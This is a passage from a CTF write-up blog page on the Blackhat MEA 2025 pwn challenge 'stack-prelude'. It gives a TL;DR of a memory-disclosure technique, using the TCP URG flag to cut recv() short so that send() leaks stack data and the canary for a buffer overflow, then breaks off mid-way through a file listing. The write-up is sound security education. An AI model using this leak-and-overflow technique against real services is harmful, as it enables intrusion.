<!DOCTYPE html><html class="bg-background text-foreground scheme-light-dark" lang="en-US"> <head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><meta name="generator" content="Astro v5.8.0"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: light)"><link rel="sitemap" href="/sitemap-index.xml"><link rel="manifest" href="/site.webmanifest"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/other-files/ClientRouter.astro_astro_type_script_index_0_lang.CtSceO8m.js"></script><title>Blackhat MEA CTF Final 2025 – pwn/stack-prelude | z0v3r1n&#39;s blog</title><meta name="title" content="Blackhat MEA CTF Final 2025 – pwn/stack-prelude | z0v3r1n's blog"><link rel="canonical" href="https://z0v3r1n.github.io"><meta property="og:title" content="Blackhat MEA CTF Final 2025 – pwn/stack-prelude"><meta property="og:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta property="og:image:alt" content="Blackhat MEA CTF Final 2025 – pwn/stack-prelude"><meta property="og:type" content="website"><meta property="og:locale" content="en-US"><meta property="og:site_name" content="z0v3r1n's blog"><meta property="og:url" content="https://z0v3r1n.github.io/blog/blackhat-mea-2025_stack_prelude/"><meta name="twitter:title" content="Blackhat MEA CTF Final 2025 – pwn/stack-prelude"><meta property="twitter:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta name="twitter:image:alt" content="Blackhat MEA CTF Final 2025 – pwn/stack-prelude"><meta name="twitter:card" content="summary_large_image"><meta property="article:tag" content="pwn"><meta property="article:tag" content="blackhat-mea"><link rel="stylesheet" href="/other-files/about.DQPP2Tja.css"></head><body class="flex h-fit min-h-screen flex-col gap-y-6 font-sans"> <header class="bg-background/50 sticky top-0 z-50 divide-y backdrop-blur-sm xl:divide-none"> <div> <div class="mx-auto flex max-w-3xl items-center justify-between gap-4 px-4 py-3"> <a href="/" target="_self" class="transition-colors duration-300 ease-in-out flex shrink-0 items-center justify-center gap-3">  <span class="hidden h-full text-lg leading-none font-medium min-[400px]:block">z0v3r1n&#39;s blog</span>  </a> <div class="flex items-center gap-4"> <nav class="flex items-center gap-4 text-sm sm:gap-6"> <a href="/blog" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> blog/
 </a><a href="/about" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> about/
 </a> </nav> <button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-muted hover:text-foreground dark:hover:bg-muted/50 -my-2 -me-2 size-8" id="theme-toggle" title="Toggle theme"> <svg width="1em" height="1em" class="size-4 dark:hidden" data-icon="lucide:sun">   <symbol id="ai:lucide:sun" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></g></symbol><use href="#ai:lucide:sun"></use>  </svg> <svg width="1em" height="1em" class="absolute hidden size-4 dark:block" data-icon="lucide:moon">   <symbol id="ai:lucide:moon" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3a6 6 0 0 0 9 9a9 9 0 1 1-9-9"/></symbol><use href="#ai:lucide:moon"></use>  </svg> <span class="sr-only">Toggle theme</span> </button> <script data-astro-rerun>
  (() => {
    const theme = (() => {
      const stored = localStorage?.getItem('theme') ?? ''
      if (['dark', 'light'].includes(stored)) return stored
      return window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
    })()

    document.documentElement.setAttribute('data-theme', theme)
    window.localStorage.setItem('theme', theme)
  })()
</script> <script type="module">function a(){const e=document.documentElement,n=e.getAttribute("data-theme")==="dark"?"light":"dark";e.classList.add("[&_*]:transition-none"),e.setAttribute("data-theme",n),window.getComputedStyle(e).getPropertyValue("opacity"),requestAnimationFrame(()=>{e.classList.remove("[&_*]:transition-none")}),localStorage.setItem("theme",n)}function o(){document.getElementById("theme-toggle")?.addEventListener("click",a)}o();document.addEventListener("astro:after-swap",()=>{const e=localStorage.getItem("theme")||"light",t=document.documentElement;t.classList.add("[&_*]:transition-none"),window.getComputedStyle(t).getPropertyValue("opacity"),t.setAttribute("data-theme",e),requestAnimationFrame(()=>{t.classList.remove("[&_*]:transition-none")}),o()});</script> </div> </div> </div>  <div id="mobile-toc-container" class="w-full xl:hidden"><details class="group"><summary class="flex w-full cursor-pointer items-center justify-between"><div class="mx-auto flex w-full max-w-3xl items-center px-4 py-3"><div class="relative mr-2 size-4"><svg class="h-4 w-4" viewBox="0 0 24 24"><circle class="text-primary/20" cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"></circle><circle id="mobile-toc-progress-circle" class="text-primary" cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2" stroke-dasharray="62.83" stroke-dashoffset="62.83" transform="rotate(-90 12 12)"></circle></svg></div><span id="mobile-toc-current-section" class="text-muted-foreground flex-grow truncate text-sm">
Overview
</span><span class="text-muted-foreground ml-2"><svg width="1em" height="1em" class="h-4 w-4 transition-transform duration-200 group-open:rotate-180" data-icon="lucide:chevron-down">   <symbol id="ai:lucide:chevron-down" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m6 9l6 6l6-6"/></symbol><use href="#ai:lucide:chevron-down"></use>  </svg></span></div></summary><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="Z2qKidy" prefix="r4" component-url="/other-files/scroll-area.C86c4as2.js" component-export="ScrollArea" renderer-url="/other-files/client.ekDkyiUY.js" props="{&quot;className&quot;:[0,&quot;mx-auto max-w-3xl&quot;],&quot;data-toc-header-scroll&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;ScrollArea&quot;,&quot;value&quot;:true}" await-children><div dir="ltr" data-slot="scroll-area" class="relative mx-auto max-w-3xl" data-toc-header-scroll="true" style="position:relative;--radix-scroll-area-corner-width:0px;--radix-scroll-area-corner-height:0px"><style>[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}</style><div data-radix-scroll-area-viewport="" data-slot="scroll-area-viewport" class="ring-ring/10 dark:ring-ring/20 dark:outline-ring/40 outline-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] focus-visible:ring-4 focus-visible:outline-1" style="overflow-x:hidden;overflow-y:hidden"><div style="min-width:100%;display:table"><astro-slot><div class="max-h-[30vh]"><ul class="flex list-none flex-col gap-y-2 px-4 pb-4" id="mobile-table-of-contents"><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#tldr" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="tldr">TL;DR</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#examining-the-provided-files" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="examining-the-provided-files">Examining the provided files</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#patching-the-binary" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="patching-the-binary">Patching the binary</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#examining-the-source-code" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="examining-the-source-code">Examining the source code</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#exploitation" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="exploitation">Exploitation</a></li></ul></div></astro-slot></div></div></div><!--astro:end--></astro-island></details></div><script type="module" src="/other-files/TOCHeader.astro_astro_type_script_index_0_lang.CKMLAwWj.js"></script> </header> <main class="w-full mx-auto flex grow flex-col gap-y-6 px-4">   <section class="grid grid-cols-[minmax(0px,1fr)_min(calc(var(--breakpoint-md)-2rem),100%)_minmax(0px,1fr)] gap-y-6">  <section class="col-start-2 flex flex-col gap-y-6 text-center"> <div class="flex flex-col"> <h1 class="mb-2 scroll-mt-31 text-3xl leading-tight font-medium sm:text-4xl" id="post-title"> Blackhat MEA CTF Final 2025 – pwn/stack-prelude </h1> <div class="text-muted-foreground divide-border mb-4 flex flex-col items-center justify-center divide-y text-xs sm:flex-row sm:flex-wrap sm:divide-x sm:divide-y-0 sm:text-sm"> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span>December 3, 2025</span> </div> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span> 13 min read  </span> </div>  </div> <div class="flex flex-wrap justify-center gap-2"> <a href="/tags/pwn" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" class="size-3" data-icon="lucide:hash">   <symbol id="ai:lucide:hash" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 9h16M4 15h16M10 3L8 21m8-18l-2 18"/></symbol><use href="#ai:lucide:hash"></use>  </svg> pwn </a><a href="/tags/blackhat-mea" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" viewBox="0 0 24 24" class="size-3" data-icon="lucide:hash">   <use href="#ai:lucide:hash"></use>  </svg> blackhat-mea </a> </div> </div> <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/blackhat-mea-2025_verifmt#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <symbol id="ai:lucide:arrow-left" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m12 19l-7-7l7-7m7 7H5"/></symbol><use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Blackhat MEA CTF Final 2025 – pwn/verifmt </span> </div>  </a>  <a href="#" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full pointer-events-none opacity-50 cursor-not-allowed" aria-disabled="true">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> You&#39;re at the newest post! </span> </div> <svg width="1em" height="1em" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <symbol id="ai:lucide:arrow-right" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7-7l7 7l-7 7"/></symbol><use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <div id="toc-sidebar-container" class="sticky top-20 col-start-1 row-span-1 mr-8 ml-auto hidden h-[calc(100vh-5rem)] max-w-md xl:block"><astro-island uid="Z10rpdt" prefix="r6" component-url="/other-files/scroll-area.C86c4as2.js" component-export="ScrollArea" renderer-url="/other-files/client.ekDkyiUY.js" props="{&quot;className&quot;:[0,&quot;flex max-h-[calc(100vh-8rem)] flex-col overflow-y-auto&quot;],&quot;type&quot;:[0,&quot;hover&quot;],&quot;data-toc-scroll-area&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;ScrollArea&quot;,&quot;value&quot;:true}" await-children><div dir="ltr" data-slot="scroll-area" class="relative flex max-h-[calc(100vh-8rem)] flex-col overflow-y-auto" data-toc-scroll-area="true" style="position:relative;--radix-scroll-area-corner-width:0px;--radix-scroll-area-corner-height:0px"><style>[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}</style><div data-radix-scroll-area-viewport="" data-slot="scroll-area-viewport" class="ring-ring/10 dark:ring-ring/20 dark:outline-ring/40 outline-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] focus-visible:ring-4 focus-visible:outline-1" style="overflow-x:hidden;overflow-y:hidden"><div style="min-width:100%;display:table"><astro-slot><div class="flex flex-col gap-2 px-4"><span class="text-lg font-medium">Table of Contents</span><ul class="flex list-none flex-col gap-y-2"><li class="text-sm ml-4 text-foreground/60"><a href="#tldr" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="tldr">TL;DR</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#examining-the-provided-files" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="examining-the-provided-files">Examining the provided files</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#patching-the-binary" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="patching-the-binary">Patching the binary</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#examining-the-source-code" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="examining-the-source-code">Examining the source code</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#exploitation" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="exploitation">Exploitation</a></li></ul></div></astro-slot></div></div></div><!--astro:end--></astro-island></div><script type="module">class f{links=document.querySelectorAll("[data-heading-link]");activeIds=[];headings=[];regions=[];scrollArea=null;tocScrollArea=null;reset(){this.links=document.querySelectorAll("#toc-sidebar-container [data-heading-link]"),this.activeIds=[],this.headings=[],this.regions=[];const t=document.getElementById("toc-sidebar-container");this.scrollArea=t?.querySelector("[data-radix-scroll-area-viewport]")||null,this.tocScrollArea=t?.querySelector("[data-toc-scroll-area]")||null}}const e=new f;class c{static build(){if(e.headings=Array.from(document.querySelectorAll(".prose h2, .prose h3, .prose h4, .prose h5, .prose h6")),e.headings.length===0){e.regions=[];return}e.regions=e.headings.map((t,o)=>{const i=e.headings[o+1];return{id:t.id,start:t.offsetTop,end:i?i.offsetTop:document.body.scrollHeight}})}static getVisibleIds(){if(e.headings.length===0)return[];const t=window.scrollY+150,o=window.scrollY+window.innerHeight,i=new Set,l=(s,r)=>s>=t&&s<=o||r>=t&&r<=o||s<=t&&r>=o;return e.headings.forEach(s=>{const r=s.offsetTop+s.offsetHeight;l(s.offsetTop,r)&&i.add(s.id)}),e.regions.forEach(s=>{if(s.start<=o&&s.end>=t){const r=document.getElementById(s.id);if(r){const a=r.offsetTop+r.offsetHeight;s.end>a&&(a<o||t<s.end)&&i.add(s.id)}}}),Array.from(i)}}class h{static update(){if(!e.scrollArea||!e.tocScrollArea)return;const{scrollTop:t,scrollHeight:o,clientHeight:i}=e.scrollArea,l=5,s=t<=l,r=t>=o-i-l;e.tocScrollArea.classList.toggle("mask-t-from-90%",!s),e.tocScrollArea.classList.toggle("mask-b-from-90%",!r)}}class g{static update(t){e.links.forEach(o=>{o.classList.remove("text-foreground")}),t.forEach(o=>{if(o){const i=document.querySelector(`#toc-sidebar-container [data-heading-link="${o}"]`);i&&i.classList.add("text-foreground")}}),this.scrollToActive(t)}static scrollToActive(t){if(!e.scrollArea||!t.length)return;const o=document.querySelector(`#toc-sidebar-container [data-heading-link="${t[0]}"]`);if(!o)return;const{top:i,height:l}=e.scrollArea.getBoundingClientRect(),{top:s,height:r}=o.getBoundingClientRect(),a=s-i+e.scrollArea.scrollTop,u=Math.max(0,Math.min(a-(l-r)/2,e.scrollArea.scrollHeight-e.scrollArea.clientHeight));Math.abs(u-e.scrollArea.scrollTop)>5&&(e.scrollArea.scrollTop=u)}}class d{static handleScroll(){const t=c.getVisibleIds();JSON.stringify(t)!==JSON.stringify(e.activeIds)&&(e.activeIds=t,g.update(e.activeIds))}static handleTOCScroll=()=>h.update();static handleResize(){c.build();const t=c.getVisibleIds();JSON.stringify(t)!==JSON.stringify(e.activeIds)&&(e.activeIds=t,g.update(e.activeIds)),h.update()}static init(){if(e.reset(),c.build(),e.headings.length===0){g.update([]);return}this.handleScroll(),setTimeout(h.update,100);const t={passive:!0};window.addEventListener("scroll",this.handleScroll,t),window.addEventListener("resize",this.handleResize,t),e.scrollArea?.addEventListener("scroll",this.handleTOCScroll,t)}static cleanup(){window.removeEventListener("scroll",this.handleScroll),window.removeEventListener("resize",this.handleResize),e.scrollArea?.removeEventListener("scroll",this.handleTOCScroll),Object.assign(e,{activeIds:[],headings:[],regions:[],scrollArea:null,tocScrollArea:null})}}document.addEventListener("astro:page-load",()=>d.init());document.addEventListener("astro:after-swap",()=>{d.cleanup(),d.init()});document.addEventListener("astro:before-swap",()=>d.cleanup());</script> <article class="prose col-start-2 max-w-none"> <h3 id="tldr">TL;DR</h3>
<p>You can make <code>recv(cfd, buf, n, MSG_WAITALL)</code> return early by sending a TCP packet with the URG flag enabled. This allows you to specify a large value of <code>n</code> while giving it less data and sending the packet to make <code>recv()</code> return early. When <code>send(cfd, buf, n, 0)</code> executes, it still transmits the large number of bytes (including uninitialized memory), leaking memory addresses and the stack canary, which enables you to exploit the buffer overflow.</p>
<h3 id="examining-the-provided-files">Examining the provided files</h3>
<p>Looking at the provided files we have the challenge binary, it’s source code and some docker config files.</p>
<div class="expressive-code"><link rel="stylesheet" href="/other-files/ec.jdn72.css"/><script type="module" src="/other-files/ec.8zarh.js"></script><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:53ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ls</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">-la</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">total</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">44</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">drwxrwxr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4096</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">03:12</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">.</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">drwxrwxr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4096</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">03:11</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">16480</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">117</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">compose.yml</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">293</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dockerfile</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span 